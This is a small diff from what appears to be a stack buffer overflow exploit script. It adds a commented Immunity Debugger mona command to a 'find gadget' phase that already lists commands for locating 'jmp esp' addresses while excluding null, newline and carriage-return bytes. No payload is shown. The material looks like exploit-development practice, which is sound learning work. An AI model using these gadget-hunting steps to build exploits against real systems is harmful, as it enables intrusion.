@@ -42,6 +42,7 @@ def main():
 	#buf += bd_ch
 	
 	# PHASE 3, FIND GADGET
+	# !mona modules
 	# !mona jmp -r esp -cpb "\x00\x0a\x0d"  --> 080416BF, 080414C3  (little endian)
 	# !mona jmp -r esp 
 	# !mona findwild -m kernel32.dll -s "jmp esp" -cpb "\x00\x0a\x0d"
